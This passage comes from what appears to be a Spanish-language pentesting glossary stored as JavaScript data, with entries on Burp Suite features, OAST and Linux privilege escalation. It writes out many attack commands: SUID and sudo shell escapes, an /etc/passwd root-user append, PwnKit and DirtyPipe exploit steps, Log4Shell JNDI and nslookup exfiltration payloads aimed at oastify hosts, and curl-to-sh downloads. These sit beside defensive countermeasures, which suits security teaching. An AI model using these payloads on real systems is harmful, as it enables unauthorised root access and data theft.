      "```python\nengine = RequestEngine(endpoint=target.endpoint,\n                       concurrentConnections=1,\n                       engine=Engine.BURP2,        # HTTP/2\n                       requestsPerConnection=30)\n# Todos los requests en un solo TCP packet\n```\n" +
      "\n**3. Credential stuffing y user enum:**\nEspecialmente cuando el server tiene rate limits temporales pero no strict per-user. 500 requests con distintos usernames en 5 segundos → user enum antes de que el rate limit se active.\n" +
      "\n**4. HTTP Request Smuggling PoC:**\nSmuggling requiere control preciso del byte layout — Turbo Intruder envía la payload raw byte por byte.\n" +
      "\n**Casos históricos:**\n" +
      "• **Starbucks 2015** — race en gift cards, exploited con approach similar (pre-Turbo).\n" +
      "• **Instacart 2020** — refunds reutilizables via race.\n" +
      "• **Coinbase 2019** — Turbo Intruder race → duplicate withdrawals ($100K bounty).\n" +
      "• **HackerOne triage 2022+** — race conditions es categoría con findings recurrentes altos.\n" +
      "\n**PortSwigger Labs con Turbo Intruder:**\n" +
      "• 'Limit overrun race conditions'\n" +
      "• 'Bypassing rate limits via race conditions'\n" +
      "• 'Multi-endpoint race conditions'\n" +
      "• 'Partial construction race conditions'\n" +
      "\n**Detección de races (defender):**\n" +
      "• **Distributed locks** en operaciones críticas (Redis SETNX, Postgres SELECT FOR UPDATE).\n" +
      "• **Idempotency keys** — cada request con UUID único; el server rechaza duplicados.\n" +
      "• **Rate limit per-IP + per-user** simultáneo.\n" +
      "• **Detección post-facto**: alerts si un user aplica el mismo cupón >N veces en <T ventana.\n" +
      "> 💡 **PortSwigger's 'Attacking secure sites with race conditions' (Kettle, 2023)** es la referencia definitiva de este vector.\n" +
      "> ⚠️ Turbo Intruder puede **crashear el target** en labs sin protection. Usar con precaución en engagements reales.",
    examples: [
      "Coinbase 2019: race en withdraws con Turbo Intruder → $100K bounty.",
      "PortSwigger Academy: labs de 'Limit overrun race' con Turbo Intruder scripts.",
      "Kettle Blackhat 2023 talk 'Smashing the state machine' con single-packet attack.",
    ],
    related: ["Extensiones esenciales del BApp Store", "Business logic vulnerabilities", "HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)", "BOLA / IDOR y Broken Object Level Auth"],
  },
  {
    id: 336,
    module: 30,
    term: "Burp Collaborator y OAST",
    short: "Servicio externo para detectar vulns 'blind' (SSRF, XXE, deserialization, Log4Shell) sin acceso al server ni Burp Suite Pro on-premise.",
    detail:
      "Muchas vulnerabilidades son **blind** — el server ejecuta el payload pero no refleja resultado en la response. Detectarlas requiere que el server **haga una request outbound** a algún servidor que controlemos. Ese servidor es el **OAST** (*Out-of-band Application Security Testing*).\n" +
      "\n**Burp Collaborator** (PortSwigger, incluido en Burp Pro):\nGenera dominios únicos por scan (`abc123.oastify.com`). Registra DNS lookups, HTTP requests, SMTP, y otros protocolos.\n" +
      "\n**Flow típico:**\n" +
      "```\n1. Burp Collaborator genera dominio único: e3nfj29ejd.oastify.com\n2. Enviamos payload al target: ?url=http://e3nfj29ejd.oastify.com/x\n3. Si el server hace SSRF a esa URL, Collaborator registra:\n   - DNS query (el server resolved el hostname)\n   - HTTP GET (el server hizo la request)\n4. 'Poll now' en Collaborator UI → confirma vuln\n```\n" +
      "\n**Vectores donde OAST es imprescindible:**\n" +
      "• **Blind SSRF** — server hace request pero no muestra output\n" +
      "• **Blind XXE con OOB** — parser XML no refleja pero puede resolver entities\n" +
      "• **Blind SQLi OOB** — `xp_dirtree`, `UTL_HTTP.REQUEST`, `LOAD_FILE` con URL a Collaborator\n" +
      "• **Blind command injection** — `whoami | nslookup abc.oastify.com`\n" +
      "• **Blind Java deserialization** — gadget que hace HTTP request\n" +
      "• **Log4Shell (`${jndi:ldap://collaborator}`)** — el vector canónico\n" +
      "• **SMTP header injection** — mail bounce a Collaborator\n" +
      "\n**Alternativas open source:**\n" +
      "\n**Interactsh** (ProjectDiscovery, gratis, open source):\n" +
      "```bash\ninteractsh-client\n# Genera dominio único\n# https://c8sjfd.oast.pro/x → poll con -json\n```\nHostado en oast.pro (público) o self-hosted (`interactsh-server`).\n" +
      "\n**canarytokens.org** (Thinkst):\nPara detección de canarios en producción (no solo pentest). Genera tokens que disparan alerts si son ejecutados: DNS, AWS API key falsa, PDF con webbug.\n" +
      "\n**xip.io / nip.io** — wildcard DNS pero **NO logging**. Útiles para bypass de local IP validation, no para OAST.\n" +
      "\n**dnslog.cn** — free service común en pentesting chino. Sin autenticación, con logs.\n" +
      "\n**Self-hosted OAST:**\nPara engagements con NDA estricto o red teams:\n" +
      "```bash\n# Interactsh self-hosted\ninteractsh-server -domain miorg.com -ip <public-ip>\n# Requiere DNS record NS delegando *.oast.miorg.com al server\n```\n" +
      "\n**Correlación con exfil chunked:**\nSi el payload permite exfiltration, encoder chunks del data en el hostname (`<chunk>.oastify.com`) y el Collaborator log te da la data.\n" +
      "\n**Detección defensive:**\n" +
      "• **Egress firewall del server** — bloquear DNS/HTTP salientes desde app tier a Internet\n" +
      "• **DNS logging + alerting** — hostnames raros como `*.oast.pro`, `*.oastify.com`, `*.burpcollaborator.net`\n" +
      "• **RASP** que detecta calls a hosts no whitelisted\n" +
      "> 💡 **Collaborator con Burp Pro** cuesta la licencia; **interactsh es gratis** para engagement grande.\n" +
      "> ⚠️ Los dominios `oastify.com` y `burpcollaborator.net` son **bien conocidos por blue teams**. Self-hosted da mayor stealth.",
    examples: [
      "Log4Shell disclosure Dec 2021: `${jndi:ldap://xxx.oastify.com/x}` en User-Agent era la PoC estándar.",
      "PortSwigger Academy: 'Blind SSRF with out-of-band detection' + 'Blind XXE with OOB'.",
      "Nuclei templates usan `{{interactsh-url}}` para OAST automatizado.",
    ],
    related: ["SSRF y metadata cloud", "XML External Entity (XXE)", "Log4Shell y JNDI injection", "Nuclei y templates modernos"],
  },
  {
    id: 337,
    module: 30,
    term: "Match & Replace, Macros y Session Handling Rules",
    short: "Automation de auth flows, CSRF tokens dinámicos y modificaciones globales de tráfico. Convierte Burp de manual a semi-automated.",
    detail:
      "En apps modernas hay 3 obstáculos comunes al pentest automatizado:\n" +
      "1. **CSRF tokens** que cambian por request.\n" +
      "2. **Sessions que expiran** durante scans largos.\n" +
      "3. **Bearer tokens** que rotan con refresh flow.\n" +
      "\nBurp maneja esto con 3 features combinables:\n" +
      "\n**1. Match & Replace (Proxy → Options):**\nReemplaza patterns en cada request/response automáticamente. Casos:\n" +
      "```\n[REQUEST]  User-Agent: Mozilla/... → CustomAgent/1.0\n[REQUEST]  Cookie: session=OLD → session=NEW\n[REQUEST]  Accept-Encoding: gzip → identity      (evita content encoding issues)\n[RESPONSE] header X-Frame-Options: DENY → (delete)     (permite iframe embedding para PoCs)\n[RESPONSE] Content-Security-Policy → (delete)          (elimina CSP para probar XSS)\n[BODY]     ${csrf_token} → ACTUAL_TOKEN\n```\n" +
      "\n**2. Macros:**\nSecuencia de requests HTTP que Burp ejecuta como precondition antes de un test.\n" +
      "\nEjemplo canónico — login antes de test:\n" +
      "```\nMacro:\n  1. POST /login {user, pass}\n  2. GET /csrf-token → extract token from response\n\nSession Handling Rule:\n  Cuando el proxy detecta 'session inválida' (302 redirect a /login):\n  → Correr macro\n  → Update cookie de la nueva session\n  → Retry request original con nueva session + token\n```\n" +
      "\n**3. Session Handling Rules (SHR):**\nOrquesta cuándo correr macros y qué modificar. Componentes:\n" +
      "• **Scope** — qué tools (Scanner, Repeater, Intruder) y qué URLs\n" +
      "• **Rule actions** en orden:\n" +
      "  - `Run macro` — ejecuta la macro\n" +
      "  - `Update current request` — inserta/reemplaza parámetros (token, cookie)\n" +
      "  - `Check session validity` — condición para invocar\n" +
      "  - `Set specific cookie` — hardcodea\n" +
      "\n**Ejemplo: automation de CSRF token dinámico:**\n" +
      "```\nMacro:\n  Request 1: GET /form → extract CSRF token de <input name=\"csrf\" value=\"...\">\n\nSHR:\n  Scope: Scanner, Intruder, Repeater\n  Actions:\n    1. Run macro before every request\n    2. Update current request with 'csrf' parameter from macro response\n  Session validity check: response contains 'invalid CSRF'\n```\nAhora Scanner e Intruder pueden fuzzear el CSRF-protected endpoint sin manualmente actualizar el token.\n" +
      "\n**Automation de OAuth Bearer:**\n" +
      "```\nMacro:\n  Request 1: POST /oauth/token {refresh_token} → extract access_token\n\nSHR:\n  Scope: All API endpoints\n  Trigger: response status 401\n  Actions:\n    1. Run macro (refresh)\n    2. Set Authorization: Bearer <new_token> in headers\n```\n" +
      "\n**Cookie Jar:**\nBurp mantiene un cookie jar global. Con SHR podés especificar qué cookies se pushean a qué requests, evitando fugas de session entre users durante multi-user testing.\n" +
      "\n**Debugging SHR:**\nProject options → Sessions → **Tracer** — muestra qué SHR se disparó, qué macro corrió, qué se modificó. Imprescindible para tuning.\n" +
      "\n**Casos avanzados:**\n" +
      "• **JWT refresh loop** — auto-refresh Bearer expired\n" +
      "• **Multi-step registration** — signup → verify email → activation → protected endpoints\n" +
      "• **Anti-automation defense** — timing delays random para evade detection\n" +
      "• **Header stripping por scope** — quitar Origin/Referer solo en endpoints internos\n" +
      "> 💡 **Setup inicial** de SHR toma 30 min pero **ahorra horas** en engagements largos con muchos scan runs.\n" +
      "> ⚠️ SHR mal configurada puede **loop infinito** (macro que hace un request → dispara SHR → macro nuevamente). Usar 'Check session validity' correctamente.",
    examples: [
      "Match & Replace del CSP en response para permitir screenshots de XSS PoCs.",
      "SHR con macro que refresh Bearer OAuth cada 401 en API testing.",
      "Autorize + SHR combinado: cada request de user A se re-envía con auth de user B automáticamente.",
    ],
    related: ["Proxy e intercept", "Extensiones esenciales del BApp Store", "Cross-Site Request Forgery (CSRF)", "OAuth 2.0 flow attacks (redirect_uri, PKCE bypass)"],
  },
  {
    id: 338,
    module: 30,
    term: "Repeater workflows profesionales (HTTP/2, copy as curl, comparer)",
    short: "Repeater no es solo 'resend request'. Con tabs, HTTP/2 view, copy as curl, comparer integration y session save, es el heart del manual testing.",
    detail:
      "**Repeater** en Burp es la herramienta más usada del pentest manual. En Burp Pro 2022+ recibió múltiples upgrades que convirtieron manual testing en workflow profesional.\n" +
      "\n**Basics + workflow tips:**\n" +
      "\n**Tabs organization:**\n" +
      "• Ctrl+T abre nueva tab.\n" +
      "• Nombre descriptivo por double-click.\n" +
      "• Groups (2023+) — carpetas de tabs por vulnerability class.\n" +
      "• Comments per-tab con Ctrl+K.\n" +
      "• Colors por severity/status.\n" +
      "\n**HTTP/2 tab:**\nAntes solo HTTP/1.1. Ahora podés inspeccionar/editar frames HTTP/2 individuales. Crítico para HRS (HTTP/2 downgrade smuggling) y algunos casos de cache poisoning.\n" +
      "```\nHTTP/2 pseudo-headers editables:\n:method GET\n:path /admin\n:authority target.com\n:scheme https\n```\n" +
      "\n**Copy as curl / Python / PowerShell:**\nRight-click en request → `Copy as curl command` (o Python, PowerShell). Ideal para:\n" +
      "• Reports (curl one-liner por PoC)\n" +
      "• Testing desde CLI\n" +
      "• Pasar a colegas sin Burp\n" +
      "```bash\ncurl -i -s -k -X POST -H 'Cookie: session=xyz' -d 'user=admin' https://target.com/api/action\n```\n" +
      "\n**Send to Comparer:**\nRight-click en request/response → `Send to Comparer`. Compará dos respuestas byte por byte. Casos:\n" +
      "• Detectar diferencias sutiles en blind SQLi (boolean-based)\n" +
      "• Verificar impact de XSS en respuesta\n" +
      "• Comparar auth vs no-auth\n" +
      "\n**Send to Intruder / Turbo Intruder:**\nDesde Repeater, ir directo al fuzzing con la request como template.\n" +
      "\n**Search dentro de request/response:**\nCtrl+F en cada panel. Con regex support. Combinado con **Show extensions** panel muestra decoded values (Base64, URL, JWT payload) inline.\n" +
      "\n**Highlight:**\nSelect text → Ctrl+H permite highlighting persistente. Útil para: marcar reflection points, XSS payloads, response de auth.\n" +
      "\n**Match/Replace en Repeater (Burp 2024+):**\nAhora Repeater tiene su propio M&R panel (además del global de Proxy). Testing de headers múltiples sin editar cada vez.\n" +
      "\n**Save/Load Repeater state:**\n\n**Project files (.burp)** contienen todas las tabs. Podés cerrar Burp con 50 tabs abiertas y retomarlas al siguiente día.\n" +
      "\n**Export para reports:**\n• Right-click → `Save item` → HTML report per-request.\n• `Save all Repeater tabs` (Burp 2023+) → export batch.\n" +
      "\n**Content-Type quick edit:**\nCambiar el body encoding (JSON → XML → multipart) con un click en el content-type. Útil para testing de content-type sniffing.\n" +
      "\n**Response render con browser embebido:**\nBurp incluye Chromium. `Response → Render tab` → muestra la página como el browser real. Detecta DOM XSS/JS bugs sin abrir external.\n" +
      "\n**Inspector (2020+):**\nPanel lateral que decodifica automáticamente todos los parts de request/response:\n• Cookies con SameSite/HttpOnly/Path\n• Headers con context de riesgo\n• URL parameters\n• Body (form-encoded, JSON, multipart) parseado\n• JWT decodificado\n• Base64 auto-detected\n\nSin necesidad de Decoder tool separada.\n" +
      "\n**Comments + issues:**\n• `Add issue` desde cualquier request → aparece en el Site Map con severity y descripción custom.\n• Comments per-tab de Repeater ayudan al context switching entre engagements.\n" +
      "\n**Send to Repeater desde otras tools:**\n• Site Map → right-click → 'Send to Repeater' (batch).\n• Logger++ → right-click → send.\n• Extensions custom → API para agregar tabs.\n" +
      "> 💡 **Groups + naming + save state** convierten Repeater en tu 'expediente de la vuln' completo — de descubrimiento a report.\n" +
      "> ⚠️ Cuidado con **share de .burp files** — pueden contener creds y sensitive data. Encriptar antes de mandar.",
    examples: [
      "Groups por vuln class: 'IDOR-1', 'SSRF-1', 'SQLi-1'; tabs por sub-caso dentro.",
      "Copy as curl para hostear PoC en Gist para bug bounty report.",
      "Comparer entre 200 y 302 responses para blind boolean-based extraction.",
    ],
    related: ["Proxy e intercept", "Extensiones esenciales del BApp Store", "Turbo Intruder + race conditions", "Match & Replace, Macros y Session Handling Rules"],
  },

  // ── M31 · Escalada de Privilegios: Linux ─────────────────────────────────
  {
    id: 340,
    module: 31,
    term: "Enumeración local (LinPEAS)",
    short: "El primer paso de la escalada: mapear el sistema en busca de vectores.",
    detail:
      "Antes de escalar hay que **enumerar** el sistema: versión del kernel, binarios SUID, permisos sudo, tareas cron, archivos world-writable, credenciales. Herramientas como **LinPEAS** y **LinEnum** automatizan este barrido y resaltan los hallazgos.\n" +
      "sudo -l\n" +
      "find / -perm -4000 2>/dev/null",
    examples: [
      "Ejecutar LinPEAS y revisar lo marcado en rojo/amarillo.",
      "sudo -l para ver qué se puede correr como root.",
    ],
    related: ["SUID/SGID abuse", "Sudo, cron y PATH hijacking", "Bits especiales SUID/SGID/sticky"],
  },
  {
    id: 341,
    module: 31,
    term: "SUID/SGID abuse",
    short: "Binarios SUID mal elegidos permiten ejecutar como root.",
    detail:
      "Un binario **SUID root** corre con privilegios de root sin importar quién lo lance. Si es un binario que permite ejecutar comandos o leer archivos (ej. `find`, `vim`, `nmap` viejo), se abusa para escalar. **GTFOBins** cataloga cómo explotar cada uno.\n" +
      "find . -exec /bin/sh -p \\; -quit\n" +
      "> 💡 GTFOBins es la referencia para 'romper' un binario SUID/sudo concreto.",
    examples: [
      "Un find SUID que lanza una shell de root.",
      "Consultar GTFOBins para el binario SUID hallado.",
    ],
    related: ["Enumeración local (LinPEAS)", "Bits especiales SUID/SGID/sticky", "Sudo, cron y PATH hijacking"],
  },
  {
    id: 342,
    module: 31,
    term: "Sudo, cron y PATH hijacking",
    short: "Reglas sudo laxas, cron jobs y un PATH manipulable abren caminos a root.",
    detail:
      "Vectores muy comunes:\n" +
      "• **sudo** mal configurado — un comando permitido que se 'rompe' (GTFOBins) o `NOPASSWD` amplio.\n" +
      "• **cron jobs** — tareas de root que ejecutan scripts modificables o con comodines.\n" +
      "• **PATH hijacking** — si un script privilegiado llama a un binario sin ruta absoluta, se coloca uno malicioso antes en el PATH.",
    examples: [
      "Un cron de root corriendo un script world-writable.",
      "Inyectar un binario falso en el PATH de un script SUID.",
    ],
    related: ["SUID/SGID abuse", "Enumeración local (LinPEAS)", "Kernel exploits y capabilities"],
  },
  {
    id: 343,
    module: 31,
    term: "Kernel exploits y capabilities",
    short: "Un kernel viejo o capabilities mal asignadas también dan root.",
    detail:
      "• **Kernel exploits** — un kernel sin parchear puede tener una vuln de escalada local (ej. Dirty COW, Dirty Pipe). Potentes pero arriesgados (pueden tumbar el sistema).\n" +
      "• **Capabilities** — permisos granulares de Linux; una mal asignada (ej. `cap_setuid` en un binario) equivale a root.\n" +
      "getcap -r / 2>/dev/null",
    examples: [
      "Dirty Pipe (2022) para escalar en kernels vulnerables.",
      "Un Python con cap_setuid+ep que da una shell de root.",
    ],
    related: ["Sudo, cron y PATH hijacking", "Vulnerable and Outdated Components", "Enumeración local (LinPEAS)"],
  },
  {
    id: 344,
    module: 31,
    term: "LinPEAS, LinEnum y pspy",
    short: "Automated enumeration para Linux privesc. LinPEAS es el estándar 2024; pspy es único porque monitorea procesos SIN root.",
    detail:
      "Después de conseguir shell como user unprivileged en Linux, el primer paso es **enumeration** — mapear qué es explotable. Herramientas modernas:\n" +
      "\n**LinPEAS (Peass-ng, activo mantenimiento):**\nBash script de 200KB+ que ejecuta ~250 checks. El estándar de facto en OSCP 2024.\n" +
      "```bash\n# Descarga + ejecución\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# O offline\nwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh -a          # all checks (2-5 min)\n./linpeas.sh -q          # quiet mode\n./linpeas.sh -o Sfw      # solo checks Files/writable\n```\n" +
      "\n**Output color-coded (bandera roja/amarilla):**\n" +
      "```\n🔴 RED    → Vulnerable/Explotable (SUID conocidos, kernel exploits, sudo NOPASSWD)\n🟡 YELLOW → Interesante (writable files, secrets en env)\nBlanco   → Info general\n```\nEl `-a` (all) toma más tiempo pero encuentra edge cases.\n" +
      "\n**Categorías de checks:**\n" +
      "• System info (kernel, distro) → linux-exploit-suggester lookup\n" +
      "• Users/groups + sudo -l\n" +
      "• Cron jobs (con permissions analysis)\n" +
      "• SUID/SGID binaries + cross-ref con GTFOBins\n" +
      "• Capabilities (cap_setuid, cap_dac_read_search)\n" +
      "• Interesting files (backup, config con creds)\n" +
      "• Env variables + PATH\n" +
      "• Services + timers\n" +
      "• NFS shares con no_root_squash\n" +
      "• Docker groups + containers\n" +
      "• Software versions con CVE lookup\n" +
      "\n**LinEnum** (legacy pero rápido):\n```bash\ncurl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh\n```\nMás simple output, sin color coding. Menos exhaustive pero rápido para initial recon.\n" +
      "\n**linux-exploit-suggester (Perl):**\nSolo enfocado en kernel exploits. Input: `uname -a` + `/etc/*-release`. Output: lista de CVEs aplicables con exploit links.\n" +
      "```bash\ncurl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh\n```\n" +
      "\n**pspy — el underrated:**\nMonitorea procesos en tiempo real **SIN necesidad de root** — usa `procfs` polling agresivo + `inotify` sobre `/proc`. Ver cron jobs, scripts que corren como root, y capturar credentials pasadas en argumentos.\n" +
      "```bash\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64\nchmod +x pspy64\n./pspy64\n```\nOutput muestra cada nuevo proceso con UID, comando, args, PID. **Descubre cron jobs privileged que un enum estático no ve** (ejecutados en frecuencias específicas).\n" +
      "\n**Uso combinado (workflow OSCP):**\n" +
      "```\n1. LinPEAS -a    (5 min) → check todo\n2. pspy64        (correr en background 5-10 min) → ver cron jobs\n3. GTFOBins       (buscar cada SUID/sudo binary reportado por LinPEAS)\n4. Manual        (leer config files, backup files reportados)\n```\n" +
      "\n**Alternativas para minimal environment:**\n" +
      "• **Bashark** — más liviano que LinPEAS\n" +
      "• **PrivilegedEsc** (Rebootuser)\n" +
      "• **BeRoot** (Python)\n" +
      "\n**Blue team detection:**\n" +
      "• **osquery** — detectar procesos con nombres tipo `linpeas`, `linenum`, `pspy` (fácil de renombrar)\n" +
      "• **eBPF probes** — detectar patterns de enumeration (finds masivos, reads de `/proc/*/cmdline`)\n" +
      "• **Falco** rules for privesc enumeration patterns\n" +
      "> 💡 En OSCP time-boxed, LinPEAS + pspy en paralelo cubre >90% de casos.\n" +
      "> ⚠️ LinPEAS dropea artifacts en `/tmp/linpeas.log` por default. En engagement realista, redirigir stdout a memoria o archivo custom.",
    examples: [
      "OSCP typical: `curl linpeas | sh` primer 30 segundos post-shell.",
      "pspy descubre cron root que corre backup.sh en `/home/user/` (writable) → shell PATH hijack.",
      "PortSwigger: LinPEAS parses `sudo -l` output y highlights NOPASSWD binaries linkeados a GTFOBins.",
    ],
    related: ["Enumeración local (LinPEAS)", "GTFOBins y binarios abusables", "Sudo, cron y PATH hijacking", "Bits especiales SUID/SGID/sticky"],
  },
  {
    id: 345,
    module: 31,
    term: "GTFOBins y binarios abusables",
    short: "Catálogo de 300+ binarios Unix legítimos que — via SUID, sudo, o capabilities — permiten escalada a root. Referencia obligada.",
    detail:
      "**GTFOBins** (gtfobins.github.io) es el catálogo canónico de binarios Unix **legítimos** que pueden abusarse para: escalar privilegios, escapar shells restringidas, exfiltrar files, leer files privilegiados, etc.\n" +
      "\nCada binary tiene una página con secciones:\n" +
      "• **Shell** — si SUID/sudo, obtener shell interactiva\n" +
      "• **Command** — ejecutar comando específico\n" +
      "• **File read** — leer archivo protegido\n" +
      "• **File write** — escribir archivo protegido\n" +
      "• **Download/Upload** — data exfil\n" +
      "• **Library load** — inject via LD_PRELOAD-like\n" +
      "• **Sudo** — con sudo específicamente\n" +
      "• **Capabilities** — con capabilities específicas\n" +
      "\n**Ejemplos canónicos:**\n" +
      "\n**vim / vi con SUID o sudo:**\n" +
      "```bash\n# En vim\n:!/bin/sh    # → shell heredando UID del binary\n# Si vim es sudo NOPASSWD → root shell\n```\n" +
      "\n**find:**\n" +
      "```bash\nfind . -exec /bin/sh \\; -quit\n# Si SUID root → root shell\n```\n" +
      "\n**less / more / man / view:**\n" +
      "```bash\n!/bin/sh\n# En el pager, ejecuta comando arbitrario\n```\n" +
      "\n**tar (SUID o sudo):**\n" +
      "```bash\ntar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh\n```\n" +
      "\n**awk / gawk:**\n" +
      "```bash\nawk 'BEGIN {system(\"/bin/sh\")}'\n```\n" +
      "\n**python / perl / ruby / node (con SUID o sudo):**\n" +
      "```bash\npython -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n```\n" +
      "\n**cp / mv / dd** — file write:\n" +
      "```bash\n# Si sudo permite cp\nsudo cp /etc/passwd /tmp/passwd_backup   # LEER passwd\necho 'attacker::0:0:root:/root:/bin/sh' | sudo tee -a /etc/passwd   # ESCRIBIR\n```\n" +
      "\n**Capabilities específicas:**\n\n**cap_setuid+ep en Python:**\n```bash\ngetcap /usr/bin/python3.11 → cap_setuid+ep\npython3.11 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n```\n\n**cap_dac_read_search+ep** — lee cualquier archivo:\n```bash\ngetcap /usr/bin/rvim → cap_dac_read_search+ep\nrvim /etc/shadow    # lee sin ser root\n```\n\n**cap_sys_admin+ep** — el equivalente casi a root:\n```bash\n# Con cap_sys_admin, mount interno posible:\nmount --bind / /tmp/rootfs    # bind mount de todo el filesystem\n```\n\n**LOLBAS — el equivalente Windows:**\nlolbas-project.github.io — 200+ binarios de Windows firmados por Microsoft que pueden abusarse (certutil.exe para download, mshta.exe para script execution, wmic.exe para lateral movement, etc.).\n" +
      "\n**Cómo usar (workflow post-enum):**\n" +
      "```\n1. LinPEAS output: \"Sudo NOPASSWD: /usr/bin/vim\"\n2. GTFOBins → search 'vim' → sudo section\n3. Copy payload: sudo vim -c ':!/bin/sh'\n4. Root shell.\n```\n" +
      "\n**Contramedidas defensivas:**\n" +
      "• **Auditar** sudo rules regularmente (sudo -l enumeration en cron).\n" +
      "• **Minimum necessary permission** — nunca dar sudo full path (usar restricted-shell alternatives).\n" +
      "• **Auditd/eBPF probes** — alert on sudo executions de GTFOBins binaries.\n" +
      "• **SELinux/AppArmor** — MAC policies que restringen incluso a root en ciertos contextos.\n" +
      "> 💡 GTFOBins es la primera stop después de LinPEAS. Cualquier SUID/sudo debería checkearse ahí.\n" +
      "> ⚠️ **Sudo -l muestra rules** de tu user; puede no listar todas las system-wide rules. También revisar `/etc/sudoers` + `/etc/sudoers.d/*` si posible.",
    examples: [
      "OSCP AD track: sudo NOPASSWD para /usr/bin/awk → root shell en 30 segundos.",
      "HTB Weblab: capability cap_setuid+ep en Python → root sin SUID.",
      "Real engagement: dev con sudo NOPASSWD para /usr/bin/less en scripts → shell escape.",
    ],
    related: ["Bits especiales SUID/SGID/sticky", "Sudo, cron y PATH hijacking", "LinPEAS, LinEnum y pspy", "Streams y redirección"],
  },
  {
    id: 346,
    module: 31,
    term: "Kernel exploits y container escape",
    short: "DirtyPipe, PwnKit, DirtyCow, runc/CRI-O escapes. Cuando privesc por config falla, kernel bugs siguen abriendo puertas.",
    detail:
      "Los **kernel exploits** son el último recurso cuando privesc por config (SUID, sudo, capabilities) no funciona. También el vector primary en container escapes.\n" +
      "\n**Los más famosos post-2020:**\n" +
      "\n**PwnKit (CVE-2021-4034, enero 2022):**\nBug de 12 años en `pkexec` (parte de polkit). Envío de `argv[0]=NULL` + env vars manipulate → escalación local a root **en la mayoría de distros Linux** (Ubuntu, Debian, RHEL, SUSE).\n" +
      "```bash\n# Detectar\npkexec --version    # < 0.120 = vuln\n\n# Exploit (uno de muchos PoCs)\ngit clone https://github.com/berdav/CVE-2021-4034\ncd CVE-2021-4034; make; ./cve-2021-4034\n```\nUno de los exploits privesc más impactantes de la década — casi todo Linux era vulnerable.\n" +
      "\n**DirtyPipe (CVE-2022-0847, marzo 2022):**\nBug en `pipe_buffer` del kernel. Permite **overwrite de cualquier archivo read-only**, incluyendo `/etc/passwd`, SUID binaries, contenedor read-only images.\n" +
      "```bash\n# Compilar exploit\ngcc -o dirtypipe dirtypipe.c\n./dirtypipe /usr/bin/sudo    # inyecta shellcode en sudo\n# Correr sudo → root shell\n```\nAfecta **kernel 5.8+ hasta 5.10.102 / 5.15.25 / 5.16.11**.\n" +
      "\n**DirtyCow (CVE-2016-5195):**\nClásico. Race condition en `mem` device permite escritura de memoria protegida. Todavía impacta kernels legacy (< 4.8.3).\n" +
      "\n**OverlayFS (CVE-2023-0386, mayo 2023):**\nBug en OverlayFS permite copy_up de archivos SUID entre namespaces → shell root.\n" +
      "\n**GameOver(lay) (CVE-2023-2640, CVE-2023-32629):**\nUbuntu-specific. Bug en OverlayFS kernel patches propios de Ubuntu → local privesc.\n" +
      "\n**Looney Tunables (CVE-2023-4911, octubre 2023):**\nBug en glibc dynamic loader (GLIBC_TUNABLES). Impacta Fedora, Ubuntu, Debian, RHEL. LPE.\n" +
      "\n**Container escapes:**\n\n**CVE-2019-5736 (runc):**\nEl clásico. Un container con permiso `docker exec` puede sobrescribir el binary `runc` del host → RCE root en host cuando el próximo `docker exec` corre.\n" +
      "```bash\n# El container aprovecha /proc/self/exe apuntando al runc del host\n# Overwrites runc con malicious binary\n```\n" +
      "\n**CVE-2022-0492 (cgroups v1):**\nContainer con capabilities específicas puede montar cgroup → release_agent con RCE root en host.\n" +
      "\n**CVE-2024-21626 (runc leaky-vessels):**\nEnero 2024. Container escape via file descriptors leaked. Impacta Docker/Kubernetes ampliamente.\n" +
      "\n**CVE-2019-14271 (docker cp):**\nBug en `docker cp` permite RCE cuando se copia files de container comprometido al host.\n" +
      "\n**Buscar exploits aplicables:**\n" +
      "```bash\n# linux-exploit-suggester\ncurl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh\n\n# LinPEAS incluye kernel exploit lookup:\n./linpeas.sh -o SysI    # solo system info + exploits\n\n# CVE search por kernel version\nuname -r                    # kernel version\nsearchsploit linux kernel 5.15\n```\n" +
      "\n**Container escape checks (post-shell in container):**\n" +
      "```bash\n# ¿Estamos en container?\ncat /proc/1/cgroup            # docker/lxc en el path\nls -la /.dockerenv            # existe = Docker\n\n# ¿Tenemos capabilities peligrosas?\ncapsh --print                 # capabilities disponibles\n\n# ¿Docker socket montado?\nls -la /var/run/docker.sock   # si sí = escape trivial\n\n# ¿Privileged container?\nps -ef; ls /dev              # con --privileged, /dev tiene devices del host\n```\n" +
      "\n**deepce.sh** — automated Docker enum + escape:\n```bash\ncurl -L https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh | sh\n```\n" +
      "\n**Contramedidas:**\n" +
      "• **Patch management** — kernel updates automáticos (unattended-upgrades)\n" +
      "• **Rootless containers** (Podman rootless, Docker rootless mode)\n" +
      "• **User namespaces** activos en Docker\n" +
      "• **Read-only root filesystem** en containers cuando posible\n" +
      "• **Drop capabilities** — `--cap-drop=ALL --cap-add=NET_BIND_SERVICE` explicit\n" +
      "• **AppArmor/SELinux** profiles for containers\n" +
      "• **gVisor / Kata Containers** — user-space kernel para aislamiento fuerte\n" +
      "> 💡 En un pentest Linux, **linux-exploit-suggester + LinPEAS + kernel version** rutinariamente encuentran CVEs LPE aplicables.\n" +
      "> ⚠️ Container escape en producción es **incident critical** — no probar en prod sin autorización específica.",
    examples: [
      "PwnKit (2022): 12 años de bug en polkit, exploited en scale por semanas post-disclosure.",
      "runc leaky-vessels (CVE-2024-21626): docker/K8s widespread impact, patches en horas.",
      "DirtyPipe writeup de Max Kellermann: uno de los papers más elegantes de kernel exploitation.",
    ],
    related: ["Sudo, cron y PATH hijacking", "GTFOBins y binarios abusables", "Vulnerable and Outdated Components", "Kubernetes security (RBAC)"],
  },
  {
    id: 347,
    module: 31,
    term: "Sudo avanzado, cron injection, wildcard exploitation",
    short: "sudo con env_keep=LD_PRELOAD, cron writable, wildcard injection en tar/rsync. Config bugs sutiles con RCE trivial.",
    detail:
